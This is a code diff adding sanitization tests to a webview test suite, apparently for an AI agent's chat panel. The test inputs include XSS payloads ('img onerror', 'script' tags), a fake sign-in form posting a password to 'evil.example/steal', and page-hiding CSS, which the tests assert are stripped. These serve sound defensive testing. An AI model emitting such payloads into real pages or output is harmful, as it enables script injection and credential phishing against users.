@@ -538,16 +538,122 @@ suite("Webview", () => {
         assert.strictEqual(msgs[0].textContent, "Hello World");
       });
 
-      test("handles streamEnd with HTML", () => {
+      test("renders completed Markdown once and removes unsafe HTML", () => {
         controller.handleMessage({ type: "streamStart" });
-        controller.handleMessage({ type: "streamChunk", text: "**bold**" });
         controller.handleMessage({
-          type: "streamEnd",
-          html: "<strong>bold</strong>",
+          type: "streamChunk",
+          text: "**bold**\n\n```ts\nconst value = 1;\n```\n\n<img src=x onerror=alert(1)><script>alert(2)</script>",
+        });
+        controller.handleMessage({ type: "streamEnd" });
+
+        const messages =
+          elements.messagesEl.querySelectorAll(".message.assistant");
+        assert.strictEqual(messages.length, 1);
+        assert.strictEqual(messages[0].querySelectorAll("strong").length, 1);
+        assert.strictEqual(
+          messages[0].querySelector("strong")?.textContent,
+          "bold"
+        );
+        assert.strictEqual(
+          messages[0].querySelector("code")?.textContent,
+          "const value = 1;\n"
+        );
+        assert.strictEqual(messages[0].querySelector("script"), null);
+        assert.strictEqual(
+          messages[0].querySelector("img")?.hasAttribute("onerror"),
+          false
+        );
+        assert.strictEqual(
+          messages[0].textContent?.includes("**bold**"),
+          false
+        );
+      });
+
+      test("drops agent-supplied forms, inputs and CSS from rendered Markdown", () => {
+        controller.handleMessage({ type: "streamStart" });
+        controller.handleMessage({
+          type: "streamChunk",
+          text: '<form action="https://evil.example/steal"><input name="password"><button>Sign in</button></form><style>body { display: none; }</style><a href="https://ok.example" target="_blank">link</a>',
+        });
+        controller.handleMessage({ type: "streamEnd" });
+
+        const message = elements.messagesEl.querySelector(".message.assistant");
+        assert.strictEqual(message?.querySelector("form"), null);
+        assert.strictEqual(message?.querySelector("input"), null);
+        assert.strictEqual(message?.querySelector("button"), null);
+        assert.strictEqual(message?.querySelector("style"), null);
+        assert.strictEqual(
+          message?.textContent?.includes("body { display: none; }"),
+          false
+        );
+        assert.strictEqual(
+          message?.querySelector("a")?.hasAttribute("target"),
+          false
+        );
+        assert.strictEqual(
+          message?.querySelector("a")?.getAttribute("href"),
+          "https://ok.example"
+        );
+      });
+
+      test("sanitizes Markdown finalized before a tool call", () => {
+        controller.handleMessage({ type: "streamStart" });
+        controller.handleMessage({
+          type: "streamChunk",
+          text: "Before **tool** <img src=x onerror=alert(1)>",
+        });
+        controller.handleMessage({
+          type: "toolCallStart",
+          toolCallId: "tool-1",
+          name: "bash",
+          kind: "execute",
         });
 
-        const msgs = elements.messagesEl.querySelectorAll(".message.assistant");
-        assert.ok(msgs[0].innerHTML.includes("<strong>"));
+        const message = elements.messagesEl.querySelector(".message.assistant");
+        assert.strictEqual(
+          message?.querySelector("strong")?.textContent,
+          "tool"
+        );
+        assert.strictEqual(
+          message?.querySelector("img")?.hasAttribute("onerror"),
+          false
+        );
+        assert.strictEqual(message?.textContent?.includes("**tool**"), false);
+      });
+
+      test("keeps completed tool output when only whitespace streamed before the tool call", () => {
+        controller.handleMessage({ type: "streamStart" });
+        controller.handleMessage({ type: "streamChunk", text: "   " });
+        controller.handleMessage({
+          type: "toolCallStart",
+          toolCallId: "tool-1",
+          name: "bash",
+          kind: "execute",
+        });
+        controller.handleMessage({
+          type: "toolCallComplete",
+          toolCallId: "tool-1",
+          status: "completed",
+          rawInput: { command: "ls -la" },
+          rawOutput: { output: "file1\nfile2" },
+        });
+        controller.handleMessage({ type: "streamEnd" });
+
+        const messages =
+          elements.messagesEl.querySelectorAll(".message.assistant");
+        assert.strictEqual(messages.length, 1);
+        assert.strictEqual(
+          messages[0].querySelectorAll(".tool-item").length,
+          1
+        );
+        assert.strictEqual(
+          messages[0].querySelector(".tool-output")?.textContent,
+          "file1\nfile2"
+        );
+        assert.strictEqual(
+          messages[0].querySelector(".tool-input-preview")?.textContent,
+          "ls -la"
+        );
       });
     });
 
